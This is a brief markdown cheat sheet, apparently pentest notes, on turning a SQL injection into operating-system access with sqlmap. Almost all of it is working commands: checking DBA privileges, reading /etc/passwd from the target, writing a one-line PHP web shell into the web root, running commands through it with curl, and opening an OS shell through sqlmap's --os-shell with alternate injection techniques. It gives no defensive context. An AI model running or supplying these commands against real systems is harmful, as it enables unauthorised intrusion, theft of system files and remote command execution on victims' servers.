# OS Exploitation
-----

### Checking for DBA Privileges
- Before performing any exploitation, we need to check if the current user has admin rights.

```bash
sqlmap -u "https://example.com/?id=1" --is-dba
```

- The current user must have DBA rights in order to perform the exploit.

### Reading Local Files

```bash
sqlmap -u "https://example.com?id=1" --file-read "/etc/passwd"
```

### Writing Local Files
- Preparing the payload

```bash
echo "<?php system($_GET['cmd']); ?>" > shell.php
```
 
- Write the file to the remote server

```bash
sqlmap -u "https://example.com?id=1" --file-write "shell.php" --file-dest 
/var/www/html/shell.php"
```

--file-write: write file to the target system
--file-dest: destination of the file on the target system

- Attempt to access the shell
```bash
curl https://example.com/shell.php?cmd=id
```

### OS Command Execution
- Since we have confirm the current user has write permission, we can use sqlmap to check if it can give us an OS shell

```bash
sqlmap -u "https://example.com?id=1" --os-shell
```

- The above command is defaulted to `UNION` technique, which sometimes does not work. We can try other techniques using `--technique` flag

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

Here we see Error-based technique is used.